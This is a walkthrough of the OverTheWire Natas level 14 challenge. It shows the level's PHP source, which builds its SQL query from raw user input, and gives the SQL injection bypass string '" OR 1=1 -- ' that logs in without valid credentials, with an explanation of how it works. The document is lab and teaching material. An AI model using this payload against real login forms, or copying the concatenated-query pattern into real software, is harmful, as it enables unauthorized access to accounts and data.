================================================================================
# OverTheWire Natas Walkthrough: Level 14 → Level 15
================================================================================

* **URL:** http://natas14.natas.labs.overthewire.org
* **Username:** natas14

---

## Walkthrough

### 1. Analyze the interface

- After logging in, we are presented with a simple login form requesting a **username** and **password**.
- The page also provides a **View sourcecode** link.

---

### 2. Inspect the source code

The relevant section of the PHP source is:

```php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas14', '<censored>');
    mysqli_select_db($link, 'natas14');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";

    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
        echo "Successful login! The password for natas15 is <censored><br>";
    } else {
        echo "Access denied!<br>";
    }
}
```

---

### 3. Identifying the vulnerability

The application directly concatenates user input into the SQL query without any sanitization or prepared statements.

The generated SQL query has the form:

```sql
SELECT * FROM users
WHERE username="<username>"
AND password="<password>";
```

Since user input is inserted directly into the SQL statement, the application is vulnerable to **SQL Injection**.

---

### 4. Exploiting the vulnerability

Use the following credentials:

**Username**

```text
" OR 1=1 -- 
```

**Password**

```text
anything
```

The resulting SQL query becomes:

```sql
SELECT * FROM users
WHERE username=""
OR 1=1 -- "
AND password="anything";
```

The `-- ` starts a SQL comment, causing everything after it to be ignored.

The query effectively becomes:

```sql
SELECT *
FROM users
WHERE username=""
OR 1=1;
```

Since `1=1` is always true, the query returns at least one row.

The application only checks whether **at least one row** is returned:

```php
if(mysqli_num_rows(mysqli_query($link, $query)) > 0)
```

Therefore, the login succeeds without knowing any valid credentials.

---

### 5. Result

The application displays:

```
Successful login!
The password for natas15 is <censored>
```

Use this password to log in to **natas15**.

---

## Key Takeaways

- Never concatenate user input directly into SQL queries.
- Use **prepared statements** or **parameterized queries** to prevent SQL Injection.
- SQL comments (`-- ` or `#`) can be used to ignore the remainder of a vulnerable query.
- Boolean expressions such as `OR 1=1` can be used to manipulate the `WHERE` clause when input is not properly sanitized.